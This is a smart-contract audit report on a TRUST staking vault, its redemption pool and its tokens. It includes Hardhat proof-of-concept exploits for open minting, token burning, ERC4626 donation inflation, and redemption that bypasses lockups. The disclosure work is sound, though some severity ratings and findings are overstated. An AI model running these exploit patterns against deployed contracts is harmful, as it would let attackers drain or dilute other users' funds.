## TrustStakingVault Findings

### [H-1] Unchecked Token Transfer Leads to Silent Failures 

#### Description:
The `TrustStakingVault::createPosition` function makes an external call using the `IERC20.transferFrom` method. However, it does not verify whether the call succeeded or failed. According to the [ERC20 specification](https://eips.ethereum.org/EIPS/eip-20), some tokens may not revert on failure, potentially leading to unintended behavior or fund loss if the call silently fails.

#### Impact:
- **Silent Failure**: Tokens may not be transferred if the `transferFrom` call fails without reverting. 
- **Loss of Funds or Integrity**: Users may believe their staking action was successful when, in reality, no tokens were transferred.

#### Recommended Mitigation:
Use the SafeERC20 library provided by OpenZeppelin to handle ERC20 transfers. The `safeTransferFrom` method includes additional checks to ensure that the transfer succeeds, reverting if it fails. 


### [H-2] Unchecked Transfer in emergencyWithdraw Leads to Silent Failures

#### Description:
The `TrustStakingVault::emergencyWithdraw` function makes an external call using the `IERC20.transfer` method. However, it does not verify whether the call succeeded or failed. According to the [ERC20 specification](https://eips.ethereum.org/EIPS/eip-20), some tokens may not revert on failure, potentially leading to unintended behavior or fund loss if the call silently fails.

#### Impact:
- **Silent Failure**: Tokens may not be transferred if the `transfer` call fails without reverting. 
- **Loss of Funds or Integrity**: Users may believe their staking action was successful when, in reality, no tokens were transferred.

#### Recommended Mitigation:
Use the SafeERC20 library provided by OpenZeppelin to handle ERC20 transfers. The `safeTransfer` method includes additional checks to ensure that the transfer succeeds, reverting if it fails.



### [H-3] Unchecked Transfer in recoverERC20 Causes Silent Failures

#### Description:
The `TrustStakingVault::recoverERC20` function makes an external call using the `IERC20.transfer` method. However, it does not verify whether the call succeeded or failed. According to the [ERC20 specification](https://eips.ethereum.org/EIPS/eip-20), some tokens may not revert on failure, potentially leading to unintended behavior or fund loss if the call silently fails.

#### Impact:
- **Silent Failure**: If the `transfer` call fails without reverting, the tokens may remain unrecovered.
- **Security Risks**: Malicious tokens or non-standard implementations could compromise the functionality and reliability of token recovery.
- **Loss of Funds**: Owners may incorrectly assume their tokens were successfully recovered when they were not.


#### Recommended Mitigation:
Use OpenZeppelin's `SafeERC20` library to replace direct calls to `transfer`. The `safeTransfer` method checks the return value and ensures the call reverts if it fails.


### [H-4] Unchecked Transfer in RedemptionPool Causes Silent Failures

#### Description:
The `RedemptionPool::withdrawExcessTokens` function uses the `IERC20.transfer` method to transfer excess tokens from the contract. However, it does not verify whether the transfer succeeded or failed. Tokens that do not fully adhere to the ERC20 standard might not revert on failure but instead return `false`. Failing to check this return value can result in silent transfer failures.

#### Impact:
- **Silent Failure**: If the `transfer` call fails without reverting, the excess tokens will remain in the contract, which could cause fund mismanagement.
- **Security Risks**: Malicious tokens or non-standard implementations can exploit this unchecked behavior, potentially leading to operational risks.
- **Loss of Trust**: Stakeholders may assume tokens have been successfully transferred when they have not, causing confusion or financial discrepancies.

#### Recommended Mitigation:
Leverage OpenZeppelin's `SafeERC20` library, which ensures that token transfers revert on failure. Replace direct calls to `transfer` with `safeTransfer`.


### [H-5] Missing Transfer Success Check in RedemptionPool::withdrawTrust Causes Silent Failures

#### Description:
The `RedemptionPool::withdrawTrust` function uses the `IERC20.transfer` method to transfer TRUST tokens but does not validate whether the transfer succeeded or failed. Some tokens might not adhere to the ERC20 standard and may return `false` instead of reverting on a failed transfer. Ignoring the outcome of the `transfer` method introduces the risk of silent failures.

#### Impact:
- **Silent Failure**: If the `transfer` fails without reverting, the TRUST tokens may remain in the contract, leading to operational failures.
- **Security Risks**: Malicious or non-compliant tokens can exploit this unchecked behavior, resulting in financial losses or trust issues.
- **User Experience**: Users might assume that withdrawals are successful when they are not, causing confusion and dissatisfaction.

#### Recommended Mitigation:
Use OpenZeppelin's `SafeERC20` library to replace direct calls to `transfer`. The `safeTransfer` function validates the return value and ensures that the transaction reverts if the transfer fails.



### [H-6] Missing Access Control in TestTRUST::mint Exposes System to Unlimited Token Minting

#### Description:
The `TestTRUST::mint` function allows anyone to mint tokens to any address without any access control mechanism. This creates a critical vulnerability where malicious actors can exploit this function to mint unlimited tokens, potentially destabilizing the system and devaluing the token.


#### Impact:
1. **Unlimited Token Minting**:
   - Any account can mint arbitrary amounts of tokens for themselves or others.
   - This can lead to token inflation, loss of trust, and devaluation of the token.

2. **Economic and Reputation Risk**:
   - Token holders and investors lose confidence due to unrestricted minting.
   - Malicious users could flood the market with excess tokens, leading to a financial loss.

3. **Security Risks**:
   - Potentially allows attackers to disrupt tokenomics and exploit other smart contracts interacting with the token.

#### Proof of Concept
```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("tTRUST Access Control Vulnerability PoC", function () {
    let owner, attacker, testTrust;
    beforeEach(async function main() {
        [owner, attacker] = await ethers.getSigners();
        console.log(`Owner Address: ${owner.address}`);
        console.log(`Attacker Address: ${attacker.address}`);
        
        // Deploy the TestTRUST contract
        const TestTRUST = await ethers.getContractFactory("TestTRUST");
        testTrust = await TestTRUST.deploy(owner.address);
        await testTrust.waitForDeployment();
      
        console.log(`TestTRUST deployed at: ${await testTrust.getAddress()}`);
      
    });
    
    it("Should allow attacker to mint tokens from any account due to missing access control in mint", async function () {
          // Check initial balance of the attacker
          let attackerBalance = await testTrust.balanceOf(attacker.address);
          console.log(`Attacker's initial balance: ${ethers.formatEther(attackerBalance)} tTRUST`);
        
          // Exploit: Attacker mints tokens to themselves
          const mintAmount = ethers.parseEther("1000000");
          const tx = await testTrust.connect(attacker).mint(attacker.address, mintAmount);
          await tx.wait();
        
          // Check balance after exploit
          attackerBalance = await testTrust.balanceOf(attacker.address);
          console.log(`Attacker's balance after exploit: ${ethers.formatEther(attackerBalance)} tTRUST`);

      });
})

```

#### Recommended Mitigation:
Restrict access to the `mint` function by adding the `onlyOwner` modifier or another robust access control mechanism to ensure only authorized accounts can mint tokens.


### [H-7] Missing Access Control allows Anyone to Burn Anyone's xTRUST Tokens

#### Description:
The `xTRUST::burnFrom` allows the caller to burn tokens from another user's account (using their allowance) without any additional restrictions. While the allowance mechanism provides some control, the absence of further access control may lead to unintended or malicious token burns if the allowance is misused.

#### Impact:
1. **Potential Misuse of Allowance**:
   - If an allowance is set mistakenly or maliciously by a user, tokens can be burned without proper safeguards.
2. **Erosion of Trust**:
   - The ability to burn tokens from an account without strict controls could reduce user confidence in the protocol.

#### Proof of Concept:
```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("xTRUST Access Control Vulnerability PoC", function () {
  let xTRUST, xTRUSTContract, owner, minter, attacker, user;

  beforeEach(async function () {
    [owner, minter, attacker, user] = await ethers.getSigners();

    // Deploy the xTRUST contract
    const xTRUST = await ethers.getContractFactory("xTRUST");
    xTRUSTContract = await xTRUST.deploy(owner.address);
    await xTRUSTContract.waitForDeployment();

    // Grant minter role to `minter` address
    await xTRUSTContract.connect(owner).grantMinterRole(minter.address);

    // Mint initial tokens to a user
    await xTRUSTContract.connect(minter).mint(user.address, ethers.parseEther("100"));
  });

  it("Should allow attacker to burn tokens from any account due to missing access control in burnFrom", async function () {
    // Attacker approves themselves to spend user's tokens
    await xTRUSTContract.connect(user).approve(attacker.address, ethers.parseEther("50"));

    // Attacker calls burnFrom on user's tokens
    await xTRUSTContract.connect(attacker).burnFrom(user.address, ethers.parseEther("50"));

    // Verify user's balance is reduced
    const userBalance = await xTRUSTContract.balanceOf(user.address);
    expect(userBalance).to.equal(ethers.parseEther("50"));

    console.log("Access Control Bypass Exploited!");
  });
});

```

#### Recommended Mitigation:
Introduce additional access control or restrictions to ensure the `burnFrom` function is not misused. This could include:
1. **Owner/Role-Based Access Control**:
   - Limit access to the `burnFrom` function to specific roles (e.g., `onlyOwner` )
2. **Permission Verification**:
   - Add a mechanism to ensure the user has explicitly authorized the burn action beyond the allowance mechanism.



### [H-8] Unchecked Transfer causes Silent Failures

#### Description:
The `xTRUST::recoverERC20` uses `IERC20.transfer` method of the ERC20 token without checking if the transfer succeeds or fails. The `transfer` method does not revert on failure by default, which could lead to unnoticed failures in token transfers.

#### Impact
If the `transfer` function fails (e.g., due to insufficient funds or other issues), the transaction would silently fail without reverting, potentially leaving the owner without the expected tokens. This could result in unexpected behavior and loss of funds.


#### Recommended Mitigation
Use OpenZeppelin's `SafeERC20` library to ensure the `transfer` call reverts on failure. Replace the direct `transfer` call with `safeTransfer`, which automatically checks for success and reverts if the transfer fails.


### [H-9] Inflation Attack on TrustStakingVault Allows Manipulation of Assets and Undervaluation of Victim's Deposit

#### Description:
The attacker is able to inflate the `TrustStakingVault`'s assets and potentially take advantage of the staking rewards or manipulate the vault state to their benefit, while the victim’s deposit remains significantly undervalued.

#### Impact:
The inflation attack allows an attacker to manipulate the staking vault by artificially inflating the token supply . This leads to unfair rewards distribution and undermines the integrity of the staking mechanism. Victims of the vault can lose out on potential rewards, as their deposit becomes comparatively insignificant against the inflated pool .

#### Proof of Concept:

1. **Attacker Deposit:** The attacker makes a tiny deposit of 1 wei .
2. **Attacker Donation:** The attacker donates a large number of tokens (100 tokens) to the staking vault, inflating the vault’s total assets.
3. **Victim Deposit:** The victim deposits 100 tokens into the staking vault. Despite the victim's deposit, the vault is already inflated by the attacker’s donation, giving the attacker an unfair advantage in terms of staking rewards or pool ownership.

```javascript
const { expect } = require("chai");
const hre = require("hardhat");
const { ethers } = require("hardhat");

describe("TrustStaking Ecosystem", function () {
    let testTrustToken, xTrustToken, aTrustToken, stakingVault, redemptionPool;
    let owner, user1, user2, user3,attacker, victim;

    beforeEach(async function () {
        [owner, user1, user2, user3, attacker, victim] = await ethers.getSigners();

        // Deploy Test TRUST Token
        const TestTRUSTToken = await ethers.getContractFactory("TestTRUST");
        testTrustToken = await TestTRUSTToken.deploy(owner.address);
        await testTrustToken.waitForDeployment();

        // Deploy xTRUST Token
        const XTrustToken = await ethers.getContractFactory("xTRUST");
        xTrustToken = await XTrustToken.deploy(owner.address);
        await xTrustToken.waitForDeployment();

        // Deploy aTRUST Token
        const ATrustToken = await ethers.getContractFactory("AccessTRUST");
        aTrustToken = await ATrustToken.deploy(owner.address);
        await aTrustToken.waitForDeployment();

        // Deploy Redemption Pool
        const RedemptionPool = await ethers.getContractFactory("TRUSTRedemptionPool");
        redemptionPool = await RedemptionPool.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            owner.address
        );
        await redemptionPool.waitForDeployment();

        // Deploy Staking Vault
        const StakingVault = await ethers.getContractFactory("TrustStakingVault");
        stakingVault = await StakingVault.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            await aTrustToken.getAddress(),
            await redemptionPool.getAddress(),
            "Staked xTRUST",
            "sxTRUST",
            ethers.parseEther("0.000000000000000001"),
            owner.address
        );
        await stakingVault.waitForDeployment();

        // console.log("ETH:", ethers.parseEther("100"));

        // Setup permissions
        await xTrustToken.grantMinterRole(await stakingVault.getAddress());
        await xTrustToken.grantMinterRole(await redemptionPool.getAddress());
        await aTrustToken.setStakingContract(await stakingVault.getAddress());

        // Mint initial tokens
        await testTrustToken.mint(owner.address, ethers.parseEther("100000"));
        await testTrustToken.mint(user1.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user2.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user3.address, ethers.parseEther("10000"));
        await testTrustToken.mint(attacker.address, ethers.parseEther("10000"));
        await testTrustToken.mint(victim.address, ethers.parseEther("10000"));

        // Setup redemption pool
        await testTrustToken.approve(
            await redemptionPool.getAddress(),
            ethers.parseEther("100000")
        );
        await redemptionPool.depositRedemptionPool(ethers.parseEther("100000"));

        // Approve spending for users
        await testTrustToken.connect(user1).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("100000000000000000000000")
        );
        await testTrustToken.connect(user2).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        await testTrustToken.connect(user3).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        
        // Enable redemption in redemption pool
        await redemptionPool.toggleRedemption();
    });

    async function printVaultState() {
        const totalSupply = await stakingVault.totalSupply();
        const vaultBalance = await testTrustToken.balanceOf(await stakingVault.getAddress());
        const attackerShares = await stakingVault.balanceOf(attacker.address);
        const victimShares = await stakingVault.balanceOf(victim.address);
        const attackerRedeemable = await stakingVault.previewRedeem(attackerShares);
        const victimRedeemable = await stakingVault.previewRedeem(victimShares);

        // console.log("--- Vault State ---");
        console.log("vault total supply", totalSupply.toString());
        console.log("vault balance", vaultBalance.toString());
        console.log("attacker shares", attackerShares.toString());
        console.log("victim shares", victimShares.toString());
        console.log("attacker redeemable", attackerRedeemable.toString());
        console.log("victim redeemable", victimRedeemable.toString());
    }

    describe("demonstrates inflation attack", function () {
        
        it("Inflation Attack", async function () {
            await testTrustToken.mint(attacker, 10 ** 9);
            await testTrustToken.mint(victim, 10 ** 9);
    
            // Approve tokens
            await testTrustToken.connect(attacker).approve(await stakingVault.getAddress(), ethers.MaxUint256);
            await testTrustToken.connect(victim).approve(await stakingVault.getAddress(), ethers.MaxUint256);
            
            console.log("--- attacker deposit ---");
            await stakingVault.connect(attacker).deposit(ethers.parseEther("0.000000000000000001"), attacker.address);
            await printVaultState();
            
            console.log("--- attacker donate ---");
            await testTrustToken.connect(attacker).transfer(await stakingVault.getAddress(), ethers.parseEther("100"));
            await printVaultState();
            
            console.log("--- victim deposit ---");
            await stakingVault.connect(victim).deposit(ethers.parseEther("100"), victim.address);
            await printVaultState();
            

        })

    });

});
```

#### Recommended Mitigation:

1. **Internal Balance:**  
   Keep a separate internal balance for each user to prevent malicious donations or transfers from inflating the vault unfairly.

2. **Dead Shares:**  
   Make the contract the first depositor with shares that cannot be redeemed, providing stability and preventing manipulation.

3. **Decimal Offset (OpenZeppelin ERC-4626):**  
   Use OpenZeppelin’s ERC-4626, which includes fixes for issues caused by small decimal values in token transfers, reducing the risk of inflation.

#### [ERC4626 Security Concerns](https://docs.openzeppelin.com/contracts/4.x/erc4626)
---

These measures help ensure fair and secure staking by limiting ways an attacker can manipulate the vault.


### [H-10] Improper ERC4626 Redeem Implementation Allows Redemption Without Duration or Penalty

#### Description:
The root cause of this vulnerability lies in the improper implementation or lack of overriding of the `redeem()` function in an ERC4626 contract. In ERC4626, the `redeem()` function is responsible for redeeming shares and returning the corresponding assets. If the function is not overridden or is implemented incorrectly (e.g., not as a `void` function or without appropriate checks for penalties or durations), users could redeem their shares without any restriction, duration, or penalty. This could allow users to bypass intended redemption rules, such as penalty fees or lock-in periods.

**Impact:**
The vulnerability could lead to unintended financial consequences, where users can redeem shares immediately, bypassing penalties or lockup durations that are crucial for the protocol's design. This could destabilize the system, lead to financial losses, or break the logic of the smart contract, resulting in a breakdown of the intended incentive structures.

#### Proof of Concept:
```javascript
const { expect } = require("chai");
const hre = require("hardhat");
const { ethers } = require("hardhat");

describe("TrustStaking Ecosystem", function () {
    let testTrustToken, xTrustToken, aTrustToken, stakingVault, redemptionPool;
    let owner, user1, user2, user3,attacker, victim;

    beforeEach(async function () {
        [owner, user1, user2, user3, attacker, victim] = await ethers.getSigners();

        // Deploy Test TRUST Token
        const TestTRUSTToken = await ethers.getContractFactory("TestTRUST");
        testTrustToken = await TestTRUSTToken.deploy(owner.address);
        await testTrustToken.waitForDeployment();

        // Deploy xTRUST Token
        const XTrustToken = await ethers.getContractFactory("xTRUST");
        xTrustToken = await XTrustToken.deploy(owner.address);
        await xTrustToken.waitForDeployment();

        // Deploy aTRUST Token
        const ATrustToken = await ethers.getContractFactory("AccessTRUST");
        aTrustToken = await ATrustToken.deploy(owner.address);
        await aTrustToken.waitForDeployment();

        // Deploy Redemption Pool
        const RedemptionPool = await ethers.getContractFactory("TRUSTRedemptionPool");
        redemptionPool = await RedemptionPool.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            owner.address
        );
        await redemptionPool.waitForDeployment();

        // Deploy Staking Vault
        const StakingVault = await ethers.getContractFactory("TrustStakingVault");
        stakingVault = await StakingVault.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            await aTrustToken.getAddress(),
            await redemptionPool.getAddress(),
            "Staked xTRUST",
            "sxTRUST",
            ethers.parseEther("0.000000000000000001"),
            owner.address
        );
        await stakingVault.waitForDeployment();

        // console.log("ETH:", ethers.parseEther("100"));

        // Setup permissions
        await xTrustToken.grantMinterRole(await stakingVault.getAddress());
        await xTrustToken.grantMinterRole(await redemptionPool.getAddress());
        await aTrustToken.setStakingContract(await stakingVault.getAddress());

        // Mint initial tokens
        await testTrustToken.mint(owner.address, ethers.parseEther("100000"));
        await testTrustToken.mint(user1.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user2.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user3.address, ethers.parseEther("10000"));
        await testTrustToken.mint(attacker.address, ethers.parseEther("10000"));
        await testTrustToken.mint(victim.address, ethers.parseEther("10000"));

        // Setup redemption pool
        await testTrustToken.approve(
            await redemptionPool.getAddress(),
            ethers.parseEther("100000")
        );
        await redemptionPool.depositRedemptionPool(ethers.parseEther("100000"));

        // Approve spending for users
        await testTrustToken.connect(user1).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("100000000000000000000000")
        );
        await testTrustToken.connect(user2).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        await testTrustToken.connect(user3).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        
        // Enable redemption in redemption pool
        await redemptionPool.toggleRedemption();
    });

    describe("Test Redeem", function () {
        it("should redeem all shares successfully", async function () {
            let DEPOSIT_AMOUNT = ethers.parseEther("100");
            // Approve and deposit tokens as attacker
            await testTrustToken.connect(attacker).approve(await stakingVault.getAddress(), DEPOSIT_AMOUNT);
            await stakingVault.connect(attacker).createPosition(DEPOSIT_AMOUNT, 1); // 1 month duration
            
            const shareBalance = await stakingVault.balanceOf(attacker.address);
            console.log("User share balance:", shareBalance.toString());
            
            const expectedAssets = await stakingVault.previewRedeem(shareBalance);
            console.log("Expected assets from redeem:", expectedAssets.toString());
            
            const initialTokenBalance = await testTrustToken.balanceOf(attacker.address);
            
            // Enable emergency withdraw
            await stakingVault.connect(owner).toggleEmergencyWithdraw();
            
            // Redeem all shares
            const tx = await stakingVault.connect(attacker).redeem(
              shareBalance,
              attacker.address,
              attacker.address
            );
        
            const finalTokenBalance = await testTrustToken.balanceOf(attacker.address);
        
            console.log("Initial token balance:", initialTokenBalance.toString());
            console.log("Final token balance:", finalTokenBalance.toString());
        
            // Assertions
            expect(finalTokenBalance).to.equal(initialTokenBalance + expectedAssets);
            expect(await stakingVault.balanceOf(attacker.address)).to.equal(0);            
        });
    });

});
```

**Recommended Mitigation:**
To mitigate this vulnerability, the `redeem()` function should be properly overridden with appropriate checks for lock-up durations and penalties. The contract should ensure that users cannot redeem shares before the lock-up period and enforce the correct penalty in case of early redemption.


### [H-11] ERC4626 Redeem Function Allows Redemption Without Duration, Penalty, or Emergency Withdraw Check

#### Description:
The root cause of this vulnerability is that the `ERC4626::redeem()` function does not check if emergency withdrawals are enabled. The `TrustStakingVault::toggleEmergencyWithdraw()` function allows the contract owner to enable or disable emergency withdrawals, but the `ERC4626::redeem()` function doesn't account for this state, users may be able to redeem shares during an emergency, bypassing lockup durations and penalty checks.

#### Impacts:
Without proper checks in place, malicious actors or even authorized users could redeem shares without penalties or respect for lock-up periods regardless of `TrustStakingVault::emergencyWithdrawEnabled` is true or false , potentially exploiting the protocol to avoid penalties or bypass intended financial restrictions. This could destabilize the contract’s economics, allow for premature withdrawals, and create an opportunity for financial manipulation.

#### Proof of Concept:
```javascript
const { expect } = require("chai");
const hre = require("hardhat");
const { ethers } = require("hardhat");

describe("TrustStaking Ecosystem", function () {
    let testTrustToken, xTrustToken, aTrustToken, stakingVault, redemptionPool;
    let owner, user1, user2, user3,attacker, victim;

    beforeEach(async function () {
        [owner, user1, user2, user3, attacker, victim] = await ethers.getSigners();

        // Deploy Test TRUST Token
        const TestTRUSTToken = await ethers.getContractFactory("TestTRUST");
        testTrustToken = await TestTRUSTToken.deploy(owner.address);
        await testTrustToken.waitForDeployment();

        // Deploy xTRUST Token
        const XTrustToken = await ethers.getContractFactory("xTRUST");
        xTrustToken = await XTrustToken.deploy(owner.address);
        await xTrustToken.waitForDeployment();

        // Deploy aTRUST Token
        const ATrustToken = await ethers.getContractFactory("AccessTRUST");
        aTrustToken = await ATrustToken.deploy(owner.address);
        await aTrustToken.waitForDeployment();

        // Deploy Redemption Pool
        const RedemptionPool = await ethers.getContractFactory("TRUSTRedemptionPool");
        redemptionPool = await RedemptionPool.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            owner.address
        );
        await redemptionPool.waitForDeployment();

        // Deploy Staking Vault
        const StakingVault = await ethers.getContractFactory("TrustStakingVault");
        stakingVault = await StakingVault.deploy(
            await testTrustToken.getAddress(),
            await xTrustToken.getAddress(),
            await aTrustToken.getAddress(),
            await redemptionPool.getAddress(),
            "Staked xTRUST",
            "sxTRUST",
            ethers.parseEther("0.000000000000000001"),
            owner.address
        );
        await stakingVault.waitForDeployment();

        // console.log("ETH:", ethers.parseEther("100"));

        // Setup permissions
        await xTrustToken.grantMinterRole(await stakingVault.getAddress());
        await xTrustToken.grantMinterRole(await redemptionPool.getAddress());
        await aTrustToken.setStakingContract(await stakingVault.getAddress());

        // Mint initial tokens
        await testTrustToken.mint(owner.address, ethers.parseEther("100000"));
        await testTrustToken.mint(user1.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user2.address, ethers.parseEther("10000"));
        await testTrustToken.mint(user3.address, ethers.parseEther("10000"));
        await testTrustToken.mint(attacker.address, ethers.parseEther("10000"));
        await testTrustToken.mint(victim.address, ethers.parseEther("10000"));

        // Setup redemption pool
        await testTrustToken.approve(
            await redemptionPool.getAddress(),
            ethers.parseEther("100000")
        );
        await redemptionPool.depositRedemptionPool(ethers.parseEther("100000"));

        // Approve spending for users
        await testTrustToken.connect(user1).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("100000000000000000000000")
        );
        await testTrustToken.connect(user2).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        await testTrustToken.connect(user3).approve(
            await stakingVault.getAddress(),
            ethers.parseEther("10000")
        );
        
        // Enable redemption in redemption pool
        await redemptionPool.toggleRedemption();
    });

    describe("Test Redeem", function () {
       
        it("should pass to redeem without emergency withdraw enabled", async function () {
            let DEPOSIT_AMOUNT = ethers.parseEther("100");
            // Approve and deposit tokens as attacker
            await testTrustToken.connect(attacker).approve(await stakingVault.getAddress(), DEPOSIT_AMOUNT);
            await stakingVault.connect(attacker).createPosition(DEPOSIT_AMOUNT, 12); // 12 months duration
        
            const shares = await stakingVault.balanceOf(attacker.address);
        
            // Expect revert when redeeming without emergency withdraw enabled
            // await expect(
              stakingVault.connect(attacker).redeem(shares, attacker.address, attacker.address)
            // ).to.be.revertedWith("EmergencyWithdrawNotEnabled"); // Replace with the correct revert message
        });
    });

});
```

**Recommended Mitigation:**
The `ERC4626::redeem()` function should be overridden to respect emergency withdrawal status (`TrustStakingVault::emergencyWithdrawEnabled`) and enforce any penalties or lockup periods. Additionally, ensure that the contract checks whether emergency withdrawals are enabled before allowing users to redeem shares.

### [M-12] Ignoring Return Value of IERC20.approve Leads to Silent Failures

#### Description:
The `TrustStakingVault::emergencyWithdraw` function calls the `IERC20.approve` method, but it does not verify the return value of the call. According to the [ERC20 specification](https://eips.ethereum.org/EIPS/eip-20), the `approve` method returns a boolean indicating success or failure. Ignoring this return value introduces the risk of silent failures, where the approval might not take effect as intended.

#### Impact:
- **Silent Failure**: If the `approve` call fails, the allowance will not be set correctly, potentially breaking the emergency withdrawal functionality.
- **Security Risks**: Malicious tokens or tokens that fail silently can prevent funds from being recovered.
- **Loss of Trust**: Users may not realize their withdrawal request failed due to an unverified approval.

#### Recommended Mitigation:
Implementing a manual check on the `approve` return value, you can effectively handle the risk of unused return values and ensure the reliability of the `emergencyWithdraw` function.

**Manual Return Value Check** : 
   ```solidity
   bool success = IERC20(token).approve(to, amount);
   require(success, "ERC20: approve failed");
   ```

### [M-13] Missing Access Control in xTRUST::burn Allows Anyone to Burn Their Own xTRUST Tokens 

#### Description:
The `xTRUST::burn` allows any user to burn tokens from their own account without any restrictions or access control. While burning from the user's own balance may appear harmless, in certain scenarios, unrestricted access to a `burn` function can lead to unintended consequences.

#### Impact:
1. **Token Supply Manipulation**: The unrestricted burning mechanism could impact supply-sensitive mechanics in your protocol, such as reward distributions or staking returns.
2. **Unintended Token Loss**: Users may burn tokens without fully understanding the implications, leading to irreversible loss.

#### Proof of Concept:
```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("xTRUST Access Control Vulnerability PoC", function () {
  let xTRUST, xTRUSTContract, owner, minter, attacker, user;

  beforeEach(async function () {
    [owner, minter, attacker, user] = await ethers.getSigners();

    // Deploy the xTRUST contract
    const xTRUST = await ethers.getContractFactory("xTRUST");
    xTRUSTContract = await xTRUST.deploy(owner.address);
    await xTRUSTContract.waitForDeployment();

    // Grant minter role to `minter` address
    await xTRUSTContract.connect(owner).grantMinterRole(minter.address);

    // Mint initial tokens to a user
    await xTRUSTContract.connect(minter).mint(user.address, ethers.parseEther("100"));
  });

  it("Should allow attacker to burn their own tokens due to missing access control in burn", async function () {
    // Attacker mints tokens for themselves (assuming they gain minter role by any means)
    await xTRUSTContract.connect(owner).grantMinterRole(attacker.address);
    await xTRUSTContract.connect(attacker).mint(attacker.address, ethers.parseEther("100"));

    // Attacker calls burn on their own tokens
    await xTRUSTContract.connect(attacker).burn(ethers.parseEther("50"));

    // Verify attacker's balance is reduced
    const attackerBalance = await xTRUSTContract.balanceOf(attacker.address);
    expect(attackerBalance).to.equal(ethers.parseEther("50"));

    console.log("Access Control Bypass Exploited for burn!");
  });
});

```

#### Recommended Mitigation:
Introduce access control or conditions for burning to ensure tokens are only burned under controlled or intentional circumstances. This can include:
1. **Access Restriction**:
   - Use an access control modifier like `onlyOwner` or a role-based system to limit who can burn tokens.
2. **User Confirmation**:
   - Require users to explicitly confirm the burn action to mitigate accidental burns.


### [M-14] Uncached Array Length in Loop Causes Gas Inefficiency in TrustStakingVault

#### Description:
The function `TrustStakingVault::getMultiplierForDuration` performs a loop over the `multipliers` array without caching the array's length. This results in repeated evaluation of `multipliers.length` in each iteration of the loop, which increases gas consumption unnecessarily. Since `multipliers.length` does not change within the loop, caching the length before the loop starts would save gas.

#### Impact: 
By not caching the array's length, the function will consume more gas, particularly when the `multipliers` array is large. Repeatedly accessing `multipliers.length` within the loop is inefficient and could lead to higher costs, especially when called frequently or in a high-demand contract.

#### Recommended Mitigation
In the for loop inside function f, the value of array.length remains constant throughout the loop. To optimize gas usage, it's better to assign array.length to a local variable and use that instead.
[Cache array Length](https://github.com/crytic/slither/wiki/Detector-Documentation#cache-array-length)


### [M-15] Uncached Array Length in Loop Causes Gas Inefficiency 

#### Description:
The function `TrustStakingVault::setMultiplier` performs a loop over the `multipliers` array without caching the array's length. This results in repeated evaluation of `multipliers.length` in each iteration of the loop, which increases gas consumption unnecessarily. Since `multipliers.length` does not change within the loop, caching the length before the loop starts would save gas.

**Impact:**  
By not caching the array's length, the function will consume more gas, particularly when the `multipliers` array is large. Repeatedly accessing `multipliers.length` within the loop is inefficient and could lead to higher costs, especially when called frequently or in a high-demand contract.

# Recommendations
In the for loop inside function f, the value of array.length remains constant throughout the loop. To optimize gas usage, it's better to assign array.length to a local variable and use that instead.
[Cache array Length](https://github.com/crytic/slither/wiki/Detector-Documentation#cache-array-length)



### [M-16] Integer Division in TrustStakingVault Causes Rounding Issues in Share Calculation

#### Description  
The function `TrsutStakingVault::_convertToShares` calculates the number of shares corresponding to a given amount of assets. The division operation (`assets * supply / totalAssets()`) is prone to rounding down in Solidity because it uses integer division. This may lead to inaccuracies in share calculations, particularly for small asset values or when the `totalAssets()` value is large relative to `assets`.

#### Impact:  
- **Loss of Precision:** Users may receive fewer shares than expected due to rounding down, resulting in a loss of value for users depositing small amounts of assets.  
- **Unfair Distribution:** Over time, this could create an imbalance in share calculations, potentially impacting the fairness of the system.  
- **Edge Case Errors:** If `assets * supply` is smaller than `totalAssets()`, the result will be zero, effectively ignoring the deposit.


#### Recommended Mitigation:  
Use OpenZeppelin’s SafeMath Library for Precision Control:  
   OpenZeppelin’s `Math` library includes functions for rounding up or down explicitly, which can help avoid unintentional precision loss. Replace the division with a rounding-aware method like `Math.mulDiv`:
   ```solidity
   return Math.mulDiv(assets, supply, totalAssets(), Math.Rounding.Up);
   ```


### [M-17] Integer Division in TrustStakingVault Causes Rounding Issues in Asset Calculation

#### Description: 
The function `TrustStakingVault::_convertToAssets` calculates the number of assets corresponding to a given number of shares. The division operation (`shares * totalAssets() / supply`) is subject to rounding down because Solidity uses integer division. This can lead to inaccuracies, especially for small share values or when `supply` is large relative to `shares`.

#### Impact:  
- **Loss of Precision:** Users may receive fewer assets than their shares are worth due to rounding down, resulting in unfair withdrawals.  
- **Cumulative Discrepancies:** Over time, repeated rounding errors could cause a cumulative imbalance in the total assets held by the contract and the assets withdrawn by users.  
- **Edge Case Errors:** If `shares * totalAssets()` is smaller than `supply`, the result will be zero, effectively ignoring the withdrawal.


#### Recommended Mitigation:  
Use OpenZeppelin’s `Math.mulDiv` for Precise Rounding:
   OpenZeppelin’s `Math` library provides a safe way to handle rounding during multiplication and division. Modify the function to explicitly control rounding:
   ```solidity
   return Math.mulDiv(shares, totalAssets(), supply, Math.Rounding.Up);
   ```


### [M-18] Rounding Down in TrustStaking::createPosition Leads to Zero Boosted Shares for Small Amounts

#### Description:  
In `TrustStaking::createPosition()::boostedShares` , rounding issue arises in the following line:

```solidity
uint256 boostedShares = (amount * multiplier) / 100;
```

